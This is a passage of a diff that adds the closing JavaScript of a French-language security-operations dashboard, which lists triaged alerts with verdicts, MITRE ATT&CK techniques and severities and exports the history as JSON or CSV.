+  $("result").innerHTML = h;
+}
+$("btn-copy").onclick = async () => { if (!current) return; try { await navigator.clipboard.writeText(JSON.stringify(current.triage, null, 2)); toast("JSON copié"); } catch { toast("Copie impossible"); } };
+
+function refresh() {
+  const n = history.length, sus = history.filter(r => !String(r.triage.verdict || "").toLowerCase().startsWith("b"));
+  $("k-total").textContent = n; $("k-sus").textContent = sus.length;
+  $("k-susp").textContent = n ? Math.round(100 * sus.length / n) + " % des alertes" : "—";
+  $("k-high").textContent = history.filter(r => sevInfo(r.triage.severite)[0] >= 4).length;
+  $("k-tech").textContent = new Set(sus.map(r => r.triage.technique_id).filter(Boolean)).size;
+  $("k-time").textContent = n ? (history.reduce((a, r) => a + r.secs, 0) / n).toFixed(0) + " s" : "—";
+  $("hist").innerHTML = n ? history.map((r, i) => { const t = r.triage, b = String(t.verdict || "").toLowerCase().startsWith("b"), [, c] = sevInfo(t.severite);
+    return `<tr class="clk" data-i="${i}"><td>${new Date(r.ts).toLocaleTimeString("fr-FR")}</td><td>${esc(r.host || "—")}</td>
+      <td><span class="pill ${b ? "ben" : "sus"}">${b ? "bénin" : "suspect"}</span></td>
+      <td>${t.technique_id ? `<span class="tag">${esc(t.technique_id)}</span> ` : ""}${esc((t.technique || "—").slice(0, 40))}</td>
+      <td>${esc((t.tactique || "—").replace(/\s*\(TA\d+\)/, ""))}</td><td><span class="sv"><i style="background:${c}"></i>${esc(t.severite || "—")}</span></td></tr>`; }).join("")
+    : `<tr><td colspan="6" class="muted" style="text-align:center; padding:24px">Aucune analyse pour le moment</td></tr>`;
+  document.querySelectorAll("#hist tr.clk").forEach(tr => tr.onclick = () => { current = history[+tr.dataset.i]; $("event").value = current.event; render(current); window.scrollTo({ top: 0, behavior: "smooth" }); });
+  const counts = {}; sus.forEach(r => { const m = String(r.triage.tactique || "").match(/TA\d{4}/); if (m) counts[m[0]] = (counts[m[0]] || 0) + 1; });
+  const max = Math.max(1, ...Object.values(counts));
+  $("tacbars").innerHTML = Object.keys(counts).length ? TACTICS.filter(([id]) => counts[id]).map(([id, nm]) =>
+    `<div class="r"><span>${esc(nm)}</span><div class="t"><i style="width:${100 * counts[id] / max}%"></i></div><span class="n">${counts[id]}</span></div>`).join("")
+    : `<div class="muted small">Les tactiques détectées apparaîtront ici.</div>`;
+}
+function download(name, content, type) { const a = document.createElement("a"); a.href = URL.createObjectURL(new Blob([content], { type })); a.download = name; a.click(); URL.revokeObjectURL(a.href); }
+$("btn-json").onclick = () => download("soc-qwen-historique.json", JSON.stringify(history, null, 2), "application/json");
+$("btn-csv").onclick = () => {
+  const q = (v) => `"${String(v ?? "").replace(/"/g, '""')}"`;
+  const rows = [["horodatage","hote","verdict","technique_id","technique","tactique","severite","explication","moteur","duree_s"]]
+    .concat(history.map(r => [r.ts, r.host, r.triage.verdict, r.triage.technique_id, r.triage.technique, r.triage.tactique, r.triage.severite, r.triage.explication, r.engine, r.secs.toFixed(1)]));
+  download("soc-qwen-historique.csv", "\ufeff" + rows.map(r => r.map(q).join(";")).join("\n"), "text/csv");
+};
+$("btn-reset").onclick = () => { if (!history.length) return; history = []; store.set("socqwen.history", history); refresh(); toast("Historique vidé"); };
+refresh();
+</script>
+</body>
+</html>
